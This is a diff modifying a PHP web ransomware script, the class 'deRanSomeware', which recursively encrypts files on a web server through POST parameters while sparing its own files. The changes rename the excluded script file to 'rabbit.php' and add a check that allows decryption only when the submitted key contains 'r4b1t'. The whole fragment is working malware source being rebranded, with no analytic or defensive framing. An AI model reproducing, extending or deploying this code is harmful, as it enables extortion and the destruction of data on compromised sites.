@@ -248,7 +248,7 @@ class deRanSomeware
             {
                 $locate = $dir.DIRECTORY_SEPARATOR.$d;
                 if(!is_dir($locate)){
-                   if(  deRanSomeware::kecuali($locate,"AwesomeWare.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"shor7cut.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htashor7cut") ){
+                   if(  deRanSomeware::kecuali($locate,"rabbit.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"shor7cut.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htashor7cut") ){
                      switch ($method) {
                         case '1':
                            deRanSomeware::shcEnCry($key,$locate);
@@ -354,7 +354,14 @@ switch ($_POST['method']) {
       deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
    break;
    case '2':
-     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
+	 $keyin=$_POST['key'];
+	if (strpos($keyin, 'r4b1t') !== false) {                                  // this is to prevent decryption attempt on wrong key entry. The correct key should contain 'r4b1t' as substring
+     	deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
+	}
+	else{
+		echo "<span class=\"glow\" style=\"font-size: 15pt;\">‪ Wrong Key </span><br>";
+	}
+
    break;
 }
 }else{
